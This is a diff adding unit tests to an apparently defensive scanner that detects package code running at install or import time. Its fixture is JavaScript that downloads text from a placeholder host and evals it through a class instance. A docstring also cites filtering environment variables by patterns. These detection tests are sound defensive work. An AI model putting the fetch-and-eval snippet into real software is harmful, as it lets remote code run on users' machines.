@@ -392,6 +392,31 @@ class MemberContainerTests(unittest.TestCase):
                 self.assertEqual(core.install_script_risk(text, lang="js"), [])
 
 
+class InstanceTests(unittest.TestCase):
+    """B-3 (0.1.9): a method reads `this` as the value it is called on, in a class made in several places, whose
+    instances B-1 keeps apart (vite's MagicString). What one method of an instance was given reached nothing another
+    method of that instance did with it (`r.setCode(t); r.run()`, where `run` evals `this.c`): such a class's `this.c`
+    holds nothing a call on an instance gives. Now it reaches it, and no other instance's. A class made once is
+    followed as before."""
+
+    CLASS = "class R {\n  setCode(t) { this.c = t; }\n  go() { this.run(); }\n  run() { eval(this.c); }\n}\n"
+    MADE = "const a = new R();\nconst b = new R();\n"
+    GET = ("const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n"
+           "  res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); a.RUN(); });\n});\n")
+    RUNS = "runs code it receives over the network"
+
+    def test_what_an_instance_was_given_another_method_runs(self):
+        for call in ("run", "go"):
+            with self.subTest(call):
+                reasons, _line = core.import_time_risk(self.CLASS + self.MADE + self.GET.replace("RUN", call), lang="js")
+                self.assertIn(self.RUNS, reasons)
+
+    def test_another_instance_runs_nothing_it_was_not_given(self):
+        text = self.CLASS + self.MADE + self.GET.replace("a.RUN()", "b.run()")
+        reasons, _line = core.import_time_risk(text, lang="js")
+        self.assertNotIn(self.RUNS, reasons)
+
+
 class NamedListTests(unittest.TestCase):
     """B-6 (0.1.9): Python's comprehension over the environment reads what the names in its test are given, as the
     JavaScript model reads a named list. `{k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}`
